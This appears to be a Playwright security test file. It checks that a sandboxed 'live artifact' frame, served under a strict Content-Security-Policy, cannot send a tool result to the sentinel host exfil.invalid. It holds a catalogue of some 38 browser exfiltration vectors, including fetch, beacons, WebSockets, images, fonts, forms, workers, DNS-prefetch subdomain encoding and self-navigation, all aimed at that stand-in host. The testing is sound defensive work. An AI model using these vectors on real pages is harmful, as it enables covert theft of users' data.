import { createServer, type Server } from 'node:http';
import { createServer as createNetServer, type AddressInfo, type Server as NetServer } from 'node:net';
import { chromium, expect, test, type Browser, type BrowserContext, type Page } from '@playwright/test';
// The real policy and helper, from the built server (`npm run build` first).
import { livePolicy } from '../../server/dist/routes/view-serve.js';
import { LIVE_CLIENT_JS } from '../../server/dist/view/live-client.js';

/**
 * Live artifacts (spec 2026-10-12-live-artifacts §12): a live page holding a
 * tool result tries every way it has of sending it out, in a frame sandboxed
 * as ArtifactView sandboxes it and served under the server's real livePolicy.
 * None may reach the sentinel host, watched two ways (see watched()): by
 * route and proxy, and by resolving the host to a listener of our own, which
 * sees sockets below the request layer. A control run of the same page with
 * no policy shows each watch sees the vectors at all. `<link rel=preconnect>`
 * and `dns-prefetch` run too but open no socket in Playwright's Chromium even
 * with no policy, so neither watch can speak for them: they rest on
 * `X-DNS-Prefetch-Control: off` and are the DNS residual of §12.
 *
 * The page navigating its own frame is the known residual (§12): it is not in
 * the zero count but documented by its own test below.
 */

const SECRET = 's3cret';
const FOLDER = '/view/abc/';
const isExfil = (host: string): boolean => host === 'exfil.invalid' || host.endsWith('.exfil.invalid');

const APP = `<!doctype html><meta charset="utf-8"><title>exfil app</title><body>
<script>
window.loads = 0;
window.addEventListener('message', (e) => {
  const d = e.data;
  if (!d || d.otherbench !== 'live-call') return;
  e.source.postMessage({ otherbench: 'live-result', v: 1, requestId: d.requestId, ok: true, text: '${SECRET}', cached: false, at: 1 }, '*');
});
const frame = document.createElement('iframe');
frame.id = 'f';
frame.setAttribute('sandbox', 'allow-scripts allow-forms');
frame.setAttribute('referrerpolicy', 'no-referrer');
frame.addEventListener('load', () => { window.loads += 1; });
frame.src = new URLSearchParams(location.search).get('frame');
document.body.appendChild(frame);
</script>`;

/** Each vector gets the URL with the data in its query, and a host with the data in its first label. */
const VECTORS = `{
  fetch: function (u) { quiet(fetch(u, { method: 'POST', body: u, mode: 'no-cors' })); },
  xhr: function (u) { var x = new XMLHttpRequest(); x.open('GET', u); x.send(); },
  websocket: function (u) { new WebSocket(u.replace(/^http/, 'ws')); },
  eventsource: function (u) { new EventSource(u); },
  beacon: function (u) { navigator.sendBeacon(u, 'x'); },
  imageObject: function (u) { new Image().src = u; },
  imgTag: function (u) { add('<img src="' + u + '">'); },
  cssBackground: function (u) { add('<div style="width:8px;height:8px;background-image:url(' + u + ')"></div>'); },
  styleImport: function (u) { add('<style>@import url("' + u + '");</style>'); },
  linkStylesheet: function (u) { make('link', { rel: 'stylesheet', href: u }); },
  linkPrefetch: function (u) { make('link', { rel: 'prefetch', href: u }); },
  linkPreconnect: function (u, h) { make('link', { rel: 'preconnect', href: h }); },
  linkDnsPrefetch: function (u, h) { make('link', { rel: 'dns-prefetch', href: h }); },
  linkPreloadImage: function (u) { make('link', { rel: 'preload', as: 'image', href: u }); },
  linkPreloadFetch: function (u) { make('link', { rel: 'preload', as: 'fetch', crossorigin: 'anonymous', href: u }); },
  linkPreloadScript: function (u) { make('link', { rel: 'preload', as: 'script', href: u }); },
  linkModulepreload: function (u) { make('link', { rel: 'modulepreload', href: u }); },
  scriptSrc: function (u) { var s = document.createElement('script'); s.src = u; stage.appendChild(s); },
  dynamicImport: function (u) { quiet(import(u)); },
  iframe: function (u) { make('iframe', { src: u }); },
  object: function (u) { make('object', { data: u }); },
  embed: function (u) { make('embed', { src: u }); },
  worker: function (u) { new Worker(u); },
  blobWorker: function (u) { new Worker(URL.createObjectURL(new Blob(['fetch(' + JSON.stringify(u) + ')'], { type: 'text/javascript' }))); },
  sharedWorker: function (u) { new SharedWorker(u); },
  formSubmit: function (u) { if (CONTROL) return; var f = make('form', { action: u, method: 'post' }); var i = document.createElement('input'); i.name = 'd'; i.value = 'x'; f.appendChild(i); f.submit(); },
  formRequestSubmit: function (u) { if (CONTROL) return; var f = make('form', { action: u, method: 'get' }); var i = document.createElement('input'); i.name = 'd'; i.value = 'x'; f.appendChild(i); f.requestSubmit(); },
  windowOpen: function (u) { window.open(u); },
  anchorBlank: function (u) { make('a', { href: u, target: '_blank' }).click(); },
  anchorPing: function (u) { make('a', { href: '#ping', ping: u }).click(); },
  video: function (u) { make('video', { src: u, preload: 'auto' }); },
  videoPoster: function (u) { make('video', { poster: u }); },
  audio: function (u) { make('audio', { src: u, preload: 'auto' }); },
  fontFace: function (u) { add('<style>@font-face{font-family:exfil;src:url(' + u + ')}</style><span style="font-family:exfil">x</span>'); },
  fontFaceApi: function (u) { quiet(new FontFace('exfil2', 'url(' + u + ')').load()); },
  svgImage: function (u) { add('<svg width="4" height="4"><image href="' + u + '" width="4" height="4"/></svg>'); },
  inputImage: function (u) { make('input', { type: 'image', src: u }); },
  pictureSource: function (u) { add('<picture><source srcset="' + u + '"><img></picture>'); }
}`;

function framePage(control: boolean): string {
  return `<!doctype html><meta charset="utf-8">
<script src="otherbench-live.js"></script>
<pre id="out">waiting</pre><div id="stage"></div>
<script>
var CONTROL = ${control};
var violations = [];
var thrown = {};
document.addEventListener('securitypolicyviolation', function (e) { violations.push(e.effectiveDirective + ' ' + e.blockedURI); });
var stage = document.getElementById('stage');
function quiet(p) { if (p && p.catch) p.catch(function () {}); }
function add(html) { var d = document.createElement('div'); d.innerHTML = html; stage.appendChild(d); }
function make(tag, attrs) { var n = document.createElement(tag); Object.keys(attrs).forEach(function (k) { n.setAttribute(k, attrs[k]); }); stage.appendChild(n); return n; }
var vectors = ${VECTORS};
otherbench.live('value').then(function (r) {
  var data = encodeURIComponent(r.text);
  var runs = [];
  Object.keys(vectors).forEach(function (name) { runs.push([name, 'http'], [name, 'https']); });
  // One per task, so a form's planned navigation can't be replaced by the next one's.
  (function next() {
    var run = runs.shift();
    if (!run) {
      setTimeout(function () {
        document.getElementById('out').textContent = JSON.stringify({ violations: violations, thrown: thrown });
        document.body.setAttribute('data-done', '1');
      }, 2500);
      return;
    }
    var name = run[0];
    var u = run[1] + '://exfil.invalid/' + name + '?d=' + data;
    var h = run[1] + '://' + name.toLowerCase() + '-' + data + '.exfil.invalid/';
    try { vectors[name](u, h); } catch (e) { thrown[name] = e.name; }
    setTimeout(next, 20);
  })();
});
</script>`;
}

/** The residual: the page navigates its own frame, by script or by a meta refresh. */
function navigatingPage(how: 'location' | 'meta'): string {
  const go =
    how === 'location'
      ? "location.href = 'http://exfil.invalid/navigate?d=' + encodeURIComponent(r.text);"
      : "var m = document.createElement('meta'); m.httpEquiv = 'refresh'; m.content = '0;url=http://exfil.invalid/navigate?d=' + encodeURIComponent(r.text); document.head.appendChild(m);";
  return `<!doctype html><meta charset="utf-8"><script src="otherbench-live.js"></script>
<script>otherbench.live('value').then(function (r) { ${go} });</script>`;
}

let server: Server;
let origin = '';
/** What reached this server as a proxy for the sentinel host: got past the route. */
const proxied: string[] = [];
let sentinel: NetServer;
let sentinelPort = 0;
/** Every socket opened to the sentinel host when its name resolves to the sentinel listener. */
const sockets: string[] = [];

/** What a socket's first bytes say it was for: an HTTP request line and Host, or a TLS hello's server name. */
function socketEntry(first: Buffer | null): string {
  if (!first) return 'silent';
  const text = first.toString('latin1');
  const request = /^[A-Z]+ (\/\S*) HTTP\/1\.1\r\n/.exec(text);
  const host = /Host: ([^\r\n:]+)/i.exec(text)?.[1];
  if (request && host) return `http://${host}${request[1]}`;
  const name = /[a-z0-9-]*\.?exfil\.invalid/.exec(text)?.[0];
  return name ? `https://${name}/` : 'unreadable';
}

test.beforeAll(async () => {
  server = createServer((req, res) => {
    // Absolute when the request came through the context's proxy.
    const url = new URL(req.url ?? '/', origin);
    if (isExfil(url.hostname)) {
      proxied.push(`${req.method} ${url.href}`);
      return void res.writeHead(403).end();
    }
    const live = { 'Content-Security-Policy': livePolicy(`${origin}${FOLDER}`), 'X-DNS-Prefetch-Control': 'off', 'Cache-Control': 'no-store' };
    const html = { 'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-store' };
    const js = { 'Content-Type': 'text/javascript; charset=utf-8', 'Cache-Control': 'no-store' };
    switch (url.pathname) {
      case '/app.html':
        return void res.writeHead(200, html).end(APP);
      case `${FOLDER}page.html`:
        return void res.writeHead(200, { ...html, ...live }).end(framePage(false));
      case `${FOLDER}nav-location.html`:
        return void res.writeHead(200, { ...html, ...live }).end(navigatingPage('location'));
      case `${FOLDER}nav-meta.html`:
        return void res.writeHead(200, { ...html, ...live }).end(navigatingPage('meta'));
      case `${FOLDER}otherbench-live.js`:
        return void res.writeHead(200, { ...js, ...live }).end(LIVE_CLIENT_JS);
      case '/control/page.html':
        return void res.writeHead(200, html).end(framePage(true));
      case '/control/otherbench-live.js':
        return void res.writeHead(200, js).end(LIVE_CLIENT_JS);
    }
    res.writeHead(404).end();
  });
  server.on('connect', (req, socket) => {
    if (isExfil((req.url ?? '').replace(/:\d+$/, ''))) proxied.push(`CONNECT https://${req.url}/`);
    socket.end('HTTP/1.1 403 Forbidden\r\n\r\n');
  });
  server.on('upgrade', (req, socket) => {
    if (isExfil(new URL(req.url ?? '/', `http://${req.headers.host}`).hostname)) proxied.push(`UPGRADE ${req.url}`);
    socket.destroy();
  });
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
  origin = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;

  sentinel = createNetServer((socket) => {
    socket.on('error', () => {});
    // A socket that sends nothing (a preconnect) still counts.
    const silent = setTimeout(() => {
      sockets.push(socketEntry(null));
      socket.destroy();
    }, 300);
    socket.once('data', (first) => {
      clearTimeout(silent);
      sockets.push(socketEntry(first));
      socket.destroy();
    });
  });
  await new Promise<void>((resolve) => sentinel.listen(0, '127.0.0.1', resolve));
  sentinelPort = (sentinel.address() as AddressInfo).port;
});

test.afterAll(async () => {
  await new Promise<void>((resolve) => server.close(() => resolve()));
  await new Promise<void>((resolve) => sentinel.close(() => resolve()));
});

type Harness = 'route' | 'socket';
type Watch = { context: BrowserContext; page: Page; hits: string[]; popups: string[]; close: () => Promise<void> };

/**
 * `route`: the shared browser, every request for the sentinel host counted
 * and aborted by the context's route, and this server as the proxy for
 * whatever gets past routing. `socket`: a browser of its own that resolves
 * the sentinel host to the sentinel listener, with no route and no proxy, so
 * a socket below the request layer (a preconnect) is seen too.
 */
async function watched(browser: Browser, harness: Harness): Promise<Watch> {
  proxied.length = 0;
  sockets.length = 0;
  const hits: string[] = [];
  const popups: string[] = [];
  let own: Browser | null = null;
  let context: BrowserContext;
  if (harness === 'route') {
    context = await browser.newContext({ proxy: { server: origin } });
    await context.route('**/*', (route) => {
      const url = route.request().url();
      if (isExfil(new URL(url).hostname)) {
        hits.push(url);
        return route.abort();
      }
      return route.continue();
    });
  } else {
    const to = `127.0.0.1:${sentinelPort}`;
    own = await chromium.launch({ args: [`--host-resolver-rules=MAP exfil.invalid ${to}, MAP *.exfil.invalid ${to}`] });
    context = await own.newContext();
  }
  const page = await context.newPage();
  context.on('page', (p) => popups.push(p.url()));
  // Not routeWebSocket: it swaps the page's WebSocket for a mock, which runs
  // ahead of the CSP check and so reports sockets the browser would refuse.
  page.on('websocket', (ws) => {
    if (isExfil(new URL(ws.url()).hostname)) hits.push(ws.url());
  });
  return { context, page, hits, popups, close: async () => { await context.close(); await own?.close(); } };
}

/** Which vector a sentinel URL came from: the first label of the host, or the first path segment. */
function vectorOf(entry: string): string {
  const raw = entry.replace(/^[A-Z]+ /, '');
  if (!/^[a-z]+:\/\//i.test(raw)) return raw;
  const url = new URL(raw);
  if (url.hostname !== 'exfil.invalid') return url.hostname.split('-')[0] ?? '';
  return url.pathname.split('/')[1] || '(origin only)';
}

async function runVectors(w: Watch, frame: string): Promise<{ violations: string[]; thrown: Record<string, string> }> {
  await w.page.goto(`${origin}/app.html?frame=${encodeURIComponent(frame)}`);
  const body = w.page.frameLocator('#f').locator('body');
  await expect(body).toHaveAttribute('data-done', '1', { timeout: 20_000 });
  // A negative check needs a moment for any request that should not happen.
  await w.page.waitForTimeout(1000);
  return JSON.parse((await w.page.frameLocator('#f').locator('#out').textContent()) ?? '{}') as { violations: string[]; thrown: Record<string, string> };
}

test('the page is served under the real livePolicy, the exact string the server unit tests pin', () => {
  expect(livePolicy('http://h/view/x/')).toBe(
    "sandbox allow-scripts allow-forms; default-src 'none'; script-src 'unsafe-inline' http://h/view/x/otherbench-live.js; style-src 'unsafe-inline'; img-src data: blob:; font-src data:; media-src data: blob:; connect-src 'none'; frame-src 'none'; child-src 'none'; worker-src 'none'; object-src 'none'; manifest-src 'none'; form-action 'none'; base-uri 'none'"
  );
});

for (const harness of ['route', 'socket'] as const) {
  test(`a live page holding a tool result cannot send it to another host by any load, fetch, form or popup (${harness})`, async ({ browser }) => {
    const w = await watched(browser, harness);
    const out = await runVectors(w, `${FOLDER}page.html`);
    const blocked = new Map<string, Set<string>>();
    for (const v of out.violations) {
      const [directive = '', uri = ''] = v.split(' ');
      if (!uri.includes('exfil.invalid')) continue;
      const name = vectorOf(uri);
      blocked.set(name, (blocked.get(name) ?? new Set()).add(directive));
    }
    test.info().annotations.push({
      type: 'per vector',
      description: JSON.stringify({ blocked: Object.fromEntries([...blocked].map(([k, v]) => [k, [...v]])), thrown: out.thrown }),
    });
    expect(w.hits).toEqual([]);
    expect(proxied).toEqual([]);
    expect(sockets).toEqual([]);
    expect(w.popups).toEqual([]);
    // Nothing navigated the frame, and the vectors really ran with the data.
    expect(await w.page.evaluate(() => (window as unknown as { loads: number }).loads)).toBe(1);
    expect(out.violations.some((v) => v.startsWith('connect-src ') && v.includes(SECRET))).toBe(true);
    await w.close();
  });

  test(`the control: the same page with no policy does reach the sentinel, so the watch sees the vectors (${harness})`, async ({ browser }) => {
    const w = await watched(browser, harness);
    await runVectors(w, '/control/page.html');
    const reached = new Set([...w.hits, ...proxied, ...sockets].map(vectorOf));
    test.info().annotations.push({ type: 'control reached', description: [...reached].sort().join(',') });
    for (const name of ['fetch', 'xhr', 'websocket', 'eventsource', 'beacon', 'imageObject', 'imgTag', 'cssBackground', 'styleImport', 'linkStylesheet', 'scriptSrc', 'iframe', 'fontFace']) {
      expect(reached, name).toContain(name);
    }
    await w.close();
  });
}

for (const how of ['location', 'meta'] as const) {
  test(`the known residual (§12): the page navigating its own frame by ${how} does send the data, and the frame loads again`, async ({ browser }) => {
    const w = await watched(browser, 'route');
    await w.page.goto(`${origin}/app.html?frame=${encodeURIComponent(`${FOLDER}nav-${how}.html`)}`);
    await expect.poll(() => w.hits.length).toBe(1);
    expect(w.hits[0]).toBe(`http://exfil.invalid/navigate?d=${SECRET}`);
    // The second load is what the viewer's navigation guard closes the page on.
    await expect.poll(() => w.page.evaluate(() => (window as unknown as { loads: number }).loads)).toBe(2);
    expect(proxied).toEqual([]);
    await w.close();
  });
}
